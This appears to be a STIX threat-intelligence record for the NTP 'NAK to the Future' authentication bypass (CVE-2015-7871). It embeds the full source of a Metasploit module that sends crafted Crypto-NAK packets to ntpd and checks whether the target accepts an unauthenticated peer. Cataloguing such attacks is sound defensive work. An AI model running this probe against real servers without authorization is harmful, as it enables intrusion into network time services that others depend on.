{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--382c41f1-60dc-4d33-9e78-42833ec10825",
    "created": "2024-08-14T16:27:48.013148Z",
    "modified": "2024-08-14T16:27:48.013152Z",
    "name": "NTP \"NAK to the Future\"",
    "description": "( Crypto-NAK packets can be used to cause ntpd to accept time from unauthenticated ephemeral symmetric peers by bypassing the authentication required to mobilize peer associations.  This module sends these Crypto-NAK packets in order to establish an association between the target ntpd instance and the attacking client.  The end goal is to cause ntpd to declare the legitimate peers \"false tickers\" and choose the attacking clients as the preferred peers, allowing these peers to control time. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ntp/ntp_nak_to_the_future.rb",
            "external_id": "ntp_nak_to_the_future.rb"
        },
        {
            "source_name": "reference",
            "url": "http://talosintel.com/reports/TALOS-2015-0069/"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisco.com/c/en/us/support/docs/availability/high-availability/19643-ntpm.html"
        },
        {
            "source_name": "reference",
            "url": "https://support.ntp.org/bin/view/Main/NtpBug2941"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-7871"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::Udp\n  include Msf::Auxiliary::NTP\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'           => 'NTP \"NAK to the Future\"',\n        'Description'    => %q(\n          Crypto-NAK packets can be used to cause ntpd to accept time from\n          unauthenticated ephemeral symmetric peers by bypassing the\n          authentication required to mobilize peer associations.  This module\n          sends these Crypto-NAK packets in order to establish an association\n          between the target ntpd instance and the attacking client.  The end goal\n          is to cause ntpd to declare the legitimate peers \"false tickers\" and\n          choose the attacking clients as the preferred peers, allowing\n          these peers to control time.\n         ),\n        'Author'         =>\n          [\n            'Matthew Van Gundy of Cisco ASIG', # vulnerability discovery\n            'Jon Hart <jon_hart[at]rapid7.com>' # original metasploit module\n          ],\n        'License'        => MSF_LICENSE,\n        'References'     =>\n          [\n            [ 'URL', 'http://talosintel.com/reports/TALOS-2015-0069/' ],\n            [ 'URL', 'https://www.cisco.com/c/en/us/support/docs/availability/high-availability/19643-ntpm.html' ],\n            [ 'URL', 'https://support.ntp.org/bin/view/Main/NtpBug2941' ],\n            [ 'CVE', '2015-7871' ]\n          ]\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('OFFSET', [true, \"Offset from local time, in seconds\", 300])\n      ])\n  end\n\n  def build_crypto_nak(time)\n    probe = Rex::Proto::NTP::NTPSymmetric.new\n    probe.stratum = 1\n    probe.poll = 10\n    probe.mode = 1\n    unless time\n      now = Time.now\n      # compute the timestamp.  NTP stores a timestamp as 64-bit unsigned\n      # integer, the high 32-bits representing the number of seconds since era\n      # epoch and the low 32-bits representing the fraction of a second.  The era\n      # epoch in this case is Jan 1 1900, so we must add the number of seconds\n      # between then and the ruby era epoch, Jan 1 1970, which is 2208988800\n      time = ((now.to_i + 2208988800 + datastore['OFFSET']) << 32) + now.nsec\n    end\n\n    # TODO: use different values for each?\n    probe.reference_timestamp = time\n    probe.origin_timestamp = time\n    probe.receive_timestamp = time\n    probe.transmit_timestamp = time\n    # key-id 0\n    probe.payload = \"\\x00\\x00\\x00\\x00\"\n    probe\n  end\n\n  def check\n    connect_udp\n\n    # pick a random 64-bit timestamp\n    canary_timestamp = rand((2**32)..((2**64) - 1))\n    probe = build_crypto_nak(canary_timestamp)\n    udp_sock.put(probe)\n\n    expected_length = probe.to_binary_s.length - probe.payload.length\n    response = udp_sock.timed_read(expected_length)\n    disconnect_udp\n    if response.length == expected_length\n      ntp_symmetric = Rex::Proto::NTP::NTPSymmetric.new.read(response)\n      if ntp_symmetric.mode == 2 && ntp_symmetric.origin_timestamp == canary_timestamp\n        vprint_good(\"#{rhost}:#{rport} - NTP - VULNERABLE: Accepted a NTP symmetric active association\")\n        report_vuln(\n          host: rhost,\n          port: rport.to_i,\n          proto: 'udp',\n          sname: 'ntp',\n          name: 'NTP \"NAK to the Future\"',\n          info: 'Accepted an NTP symmetric active association by replying with a symmetric passive request',\n          refs: references\n        )\n        return Exploit::CheckCode::Appears\n      end\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def run_host(_ip)\n    check\n  end\nend\n"
}